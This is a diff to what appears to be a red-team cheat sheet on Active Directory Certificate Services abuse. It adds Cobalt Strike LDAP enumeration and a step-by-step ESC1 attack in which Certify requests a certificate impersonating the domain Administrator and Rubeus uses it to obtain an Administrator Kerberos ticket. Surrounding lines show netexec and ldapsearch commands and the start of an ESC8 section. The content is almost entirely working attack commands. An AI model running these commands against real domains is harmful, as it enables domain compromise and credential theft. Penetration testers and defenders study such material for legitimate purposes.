@@ -31,6 +31,27 @@ netexec ldap domain.lab -u username -p password -M adcs
 ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
 ```
 
+CobaltStrike
+```
+ldapsearch (|(objectClass=pKIEnrollmentService)(objectClass=pKICertificateTemplate)) --attributes *,ntsecuritydescriptor
+```
+# ESC1
+
+1. Enumerate the certificate authority for vulnerable templates.
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
+```
+
+2. Request a certificate, specifying the default domain Administrator's _UserPrincipalName_ in the certificate's Subject Alternative Name (SAN).
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
+```
+
+3. Use Rubeus to request a TGT for Administrator.
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
+```
+
 # ESC8 - coercition vers domain admin
 
 Pré-requis :
